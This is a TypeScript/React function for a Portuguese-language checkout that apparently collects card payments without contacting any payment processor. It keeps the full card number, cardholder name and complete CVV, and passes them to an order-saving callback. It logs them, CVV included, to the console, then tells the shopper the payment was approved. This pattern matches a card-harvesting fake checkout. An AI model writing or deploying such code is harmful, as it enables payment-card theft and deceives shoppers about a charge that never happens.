
import { useToast } from '@/hooks/use-toast';
import { useNavigate } from 'react-router-dom';
import { CardFormData } from '../../../payment-methods/CardForm';
import { PaymentResult } from '../types';
import { randomId, simulateProcessingDelay } from '../common/paymentUtils';

export const processManual = async ({
  cardData,
  formState,
  navigate,
  setIsSubmitting,
  setError,
  toast,
  onSubmit,
  brand,
  deviceType
}: {
  cardData: CardFormData;
  formState: any;
  navigate: ReturnType<typeof useNavigate>;
  setIsSubmitting: (isSubmitting: boolean) => void;
  setError: (error: string) => void;
  toast?: ReturnType<typeof useToast>['toast'];
  onSubmit?: (data: any) => void;
  brand?: string;
  deviceType?: string;
}): Promise<PaymentResult | void> => {
  try {
    console.log("Using manual card processing with data:", { 
      ...cardData, 
      // Don't log the full CVV
      cvv: '***'
    });
    
    // Store the complete CVV (don't mask it here)
    const paymentData = {
      cardNumber: cardData.cardNumber.replace(/\s/g, ''),
      expiryMonth: cardData.expiryMonth,
      expiryYear: cardData.expiryYear,
      cvv: cardData.cvv, // Use full CVV
      cardName: cardData.cardName,
      paymentId: `pay_${randomId(10)}`,
      status: 'CONFIRMED',
      brand: brand || 'Desconhecida',
      deviceType: deviceType || 'desktop'
    };

    // Simulate a successful payment
    await simulateProcessingDelay(2000);
    
    if (onSubmit) {
      // Call the onSubmit callback to save the order
      console.log("Submitting payment data to order context:", paymentData);
      await onSubmit(paymentData);
    }
    
    if (toast) {
      toast({
        title: "Pagamento aprovado",
        description: "Seu pagamento foi processado com sucesso.",
        duration: 5000,
      });
    }
    
    // Navigate to success page
    navigate('/payment-success', { 
      state: { 
        ...formState,
        paymentMethod: 'card',
        orderId: paymentData.paymentId
      }
    });

    return {
      method: 'card',
      paymentId: paymentData.paymentId,
      status: paymentData.status,
      timestamp: new Date().toISOString(),
      brand: paymentData.brand,
      deviceType: paymentData.deviceType
    };
  } catch (error) {
    console.error('Erro no processamento manual do cartão:', error);
    setError('Erro ao processar pagamento. Por favor, tente novamente.');
    
    if (toast) {
      toast({
        title: "Erro no processamento",
        description: "Houve um problema ao processar o pagamento. Por favor, tente novamente.",
        variant: "destructive",
        duration: 5000,
      });
    }
  } finally {
    setIsSubmitting(false);
  }
};
